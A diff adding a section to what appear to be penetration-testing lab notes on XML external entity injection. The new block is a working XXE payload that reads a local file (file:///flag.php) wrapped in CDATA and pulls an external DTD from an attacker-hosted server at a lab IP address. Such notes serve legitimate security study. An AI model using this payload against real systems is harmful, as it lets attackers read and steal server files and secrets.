@@ -55,3 +55,14 @@ Reference an external DTD (one you're locally hosting):
 ```
 **Note**: In some modern web servers, we may not be able to read some files (like index.php), as the web server would be preventing a DOS attack caused by file/entity self-reference (i.e., XML entity reference loop), as mentioned in the previous section.
 
+- NOTE TRIPLE SLASHES
+```
+<!DOCTYPE email [
+  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
+  <!ENTITY % file SYSTEM "file:///flag.php"> <!-- reference external file -->
+  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
+  <!ENTITY % xxe SYSTEM "http://10.10.14.75:8000/xxe.dtd"> <!-- reference our external DTD -->
+  %xxe;
+]>
+```
+
